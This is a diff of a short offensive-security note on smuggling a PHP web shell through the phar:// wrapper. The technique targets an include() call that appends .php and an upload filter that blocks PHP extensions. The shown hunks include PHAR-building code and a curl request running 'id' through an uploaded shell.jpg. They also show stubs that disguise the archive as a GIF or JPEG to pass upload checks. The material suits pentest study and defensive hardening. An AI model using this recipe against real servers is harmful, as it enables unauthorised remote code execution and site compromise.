@@ -1,16 +1,18 @@
 # php phar RFI smuggling
 
 **Author:** Julien Bongars\
-**Date:** 2026-02-13 01:36:15
+**Date:** 2026-02-13 01:36:15\
 **Path:**
 
 ---
 
-Smuggle PHP via `phar://` when `include()` appends `.php` and the upload filter blocks PHP extensions.
+link: https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization.html
 
-## Attack
+You can use phar:// protocol to smuggle a PHP source page to destination
 
-### Construct the PHAR
+### Attack
+
+#### Construct the PHAR
 
 ```php
 <?php
@@ -25,7 +27,7 @@ $phar->setStub("<?php __HALT_COMPILER(); ?>");
 $phar->stopBuffering();
 ```
 
-### Upload and call the PHAR/shell.php
+#### Upload and call the PHAR/shell.php
 
 ```bash
 # Step 1: Build the PHAR
@@ -45,7 +47,7 @@ curl "http:///index.php?page=phar://uploads/shell.jpg/shell&cmd=id"
 # Expected output: uid=33(www-data) ...
 ```
 
-## Source
+### Source
 
 ```php
 <?php
@@ -96,8 +98,3 @@ $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
 $jpeg = file_get_contents('legit.jpg');  // any valid JPEG
 $phar->setStub($jpeg . "<?php __HALT_COMPILER(); ?>");
 ```
-
-## Resources
-
-- [PHP phar:// wrapper](https://www.php.net/manual/en/wrappers.phar.php) — stream wrapper and stub rules
-- [HackTricks — PHAR deserialization](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization.html) — upload + include trigger
